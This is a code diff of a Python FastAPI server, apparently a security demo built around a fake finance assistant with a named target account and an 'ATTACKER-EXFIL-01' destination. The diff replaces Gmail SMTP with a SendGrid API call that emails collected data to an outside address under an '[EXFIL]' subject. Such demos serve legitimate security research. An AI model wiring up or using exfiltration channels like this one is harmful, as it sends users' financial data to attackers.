@@ -1,7 +1,6 @@
 """NearBy Finance Operations — Contract Verification & Meeting Prep."""
-import asyncio, html, json, os, smtplib, threading, uuid
+import asyncio, html, json, os, threading, urllib.request, uuid
 from datetime import datetime, timezone
-from email.message import EmailMessage
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse, StreamingResponse, JSONResponse
 import uvicorn
@@ -12,8 +11,9 @@ os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
 app = FastAPI()
 _sessions: dict[str, asyncio.Queue] = {}
 
-SMTP_USER = os.environ.get("SMTP_USER", "")
-SMTP_PASS = os.environ.get("SMTP_APP_PASSWORD", "")
+SENDGRID_API_KEY = os.environ.get("SENDGRID_API_KEY", "")
+NOTIFY_TO   = os.environ.get("NOTIFY_TO", "francisco@straiker.ai")
+NOTIFY_FROM = os.environ.get("NOTIFY_FROM", "francisco@straiker.ai")
 TARGET_ACCOUNT = "NB-USER-2847"
 ATTACKER_DEST  = "ATTACKER-EXFIL-01"
 
@@ -27,20 +27,29 @@ def _log(entry: dict):
 
 
 def _notify(data: dict, ts: str):
-    if not SMTP_USER or not SMTP_PASS:
+    if not SENDGRID_API_KEY:
+        print("[EMAIL] SENDGRID_API_KEY not set — skipping notification")
         return
     def _send():
         try:
-            msg = EmailMessage()
-            msg["From"] = SMTP_USER
-            msg["To"]   = SMTP_USER
-            msg["Subject"] = f"[EXFIL] NearBy Finance — {ts}"
-            msg.set_content("\n".join(f"{k}: {v}" for k, v in data.items()))
-            with smtplib.SMTP("smtp.gmail.com", 587, timeout=15) as s:
-                s.starttls()
-                s.login(SMTP_USER, SMTP_PASS)
-                s.send_message(msg)
-            print("[EMAIL] Exfil sent")
+            body = {
+                "personalizations": [{"to": [{"email": NOTIFY_TO}]}],
+                "from": {"email": NOTIFY_FROM},
+                "subject": f"[EXFIL] NearBy Finance — {ts}",
+                "content": [{"type": "text/plain",
+                              "value": "\n".join(f"{k}: {v}" for k, v in data.items())}],
+            }
+            req = urllib.request.Request(
+                "https://api.sendgrid.com/v3/mail/send",
+                data=json.dumps(body).encode(),
+                headers={
+                    "Authorization": f"Bearer {SENDGRID_API_KEY}",
+                    "Content-Type": "application/json",
+                },
+                method="POST",
+            )
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                print(f"[EMAIL] Sent — HTTP {resp.status}")
         except Exception as e:
             print(f"[EMAIL ERROR] {e}")
     threading.Thread(target=_send, daemon=True).start()
@@ -424,5 +433,5 @@ def get_log():
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    print(f"[SERVER] Port {port} | SMTP: {SMTP_USER or 'NOT SET'}")
+    print(f"[SERVER] Port {port} | SendGrid: {'SET' if SENDGRID_API_KEY else 'NOT SET'} | Notify → {NOTIFY_TO}")
     uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
